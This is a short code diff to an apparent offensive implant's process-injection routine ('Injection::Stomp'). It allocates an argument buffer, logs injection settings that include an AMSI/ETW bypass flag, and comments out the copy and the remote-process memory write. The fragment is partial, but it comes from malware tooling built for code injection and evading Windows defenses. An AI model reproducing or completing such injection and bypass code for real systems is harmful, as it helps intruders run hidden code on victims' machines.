@@ -321,7 +321,7 @@ auto DECLFN Injection::Stomp(
     };
 
     PVOID TempAddress    = Self->Mm->Alloc( nullptr, ArgSize + 16, MEM_COMMIT, PAGE_READWRITE );
-    PVOID CurrentTempPos = TempAddress;
+    PBYTE CurrentTempPos = (PBYTE)TempAddress;
 
     if ( Object->ForkCategory || Object->ExecMethod ) {
         SIZE_T headerSize   = 16; 
@@ -366,14 +366,14 @@ auto DECLFN Injection::Stomp(
         KhDbg("Added injection header: ExecMethod=%lu, ForkCategory=%lu, Syscall=%lu, AmsiEtwBypass=%lu, PipeSize=%lu, ArgSize=%lu, TotalHeaderSize=%llu", 
             Object->ExecMethod, Object->ForkCategory, Self->Config.Syscall, Self->Config.AmsiEtwBypass, pipeNameSize, ArgSize, headerSize); 
         
-        KhDbg("Parameter points to: %p", Parameter);
+        // KhDbg("Parameter points to: %p", Parameter);
     } else if ( ArgSize > 0 ) {
-        Mem::Copy( CurrentTempPos, ArgBuff, ArgSize );
-        KhDbg("Copied ArgBuff (size=%llu), Parameter=%p", ArgSize, Parameter);
+        // Mem::Copy( CurrentTempPos, ArgBuff, ArgSize );
+        // KhDbg("Copied ArgBuff (size=%llu), Parameter=%p", ArgSize, Parameter);
     }
 
-    if ( ! MemWrite( BaseAddress, TempAddress, FullSize ) ) {
-        KhDbg("Failed MemWrite to process");
-        return Cleanup();
-    }
+    // if ( ! MemWrite( BaseAddress, TempAddress, FullSize ) ) {
+    //     KhDbg("Failed MemWrite to process");
+    //     return Cleanup();
+    // }
 }   
